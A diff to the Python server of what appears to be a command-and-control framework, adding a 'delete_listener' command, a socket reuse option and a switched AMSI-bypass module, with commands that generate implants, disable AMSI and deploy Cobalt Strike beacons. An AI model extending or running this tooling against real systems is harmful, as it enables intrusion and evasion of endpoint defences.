@@ -13,6 +13,8 @@ from profile import *
 import time
 import os
 import socket
+from socket import SO_REUSEADDR, SOL_SOCKET
+
 
 requests = []
 counter = 1
@@ -23,7 +25,7 @@ commands = {}
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
 aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark", "delete_listener"]
 
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules", "deploy_cobalt_beacon"]
 
@@ -47,18 +49,12 @@ def check_listener_name(listener_name):
 	else:
 		return True
 
-def check_create_path(hostname):
-	if len(listeners_information) > 0:
-	    for listener in listeners_information:
-		    if hostname == listeners_information[listener][3]:
-			    return False
-		    else:
-			    return True
-	else:
-		return True
-
 def check_listener_port(host, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # dont check standard timeout
+    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+
     try:
         sock.bind((host, port))
         sock.close()
@@ -69,7 +65,7 @@ def check_listener_port(host, port):
 def list_sessions():
 	    data = []
 	    for key in connections_information:
-	        data.append(connections_information[key])
+               data.append(connections_information[key])
 	    print(("\n\n" + tabulate(data, ["Session", "IP", "Hostname", "PID", "Username", "Domain", "Last ping", "OS"], "simple") + "\n\n"))
 
 def get_history():
@@ -157,7 +153,7 @@ def deploy_cobalt_beacon(session, beacon_path):
         print(colored("[-] Powershell beacon file not exist!"))
 
 def disable_amsi(session):
-	amsi_module = "modules/ASBBypass.ps1"
+	amsi_module = "modules/ILBypass.ps1"
 	if os.path.isfile(amsi_module):
 		fi = open(amsi_module, "r")
 		module_content = fi.read()
@@ -237,6 +233,7 @@ def main_help_banner():
     print("* listen_https  \t\tto start a HTTPS listener")
     print("interact {session}  \t\tto interact with a session")
     print("delete {session}  \t\tto delete a session")
+    print("delete_listener {listener_name} to delete a listener")
     print("exit \t\t\t\texit current session")
     print("\n")
 
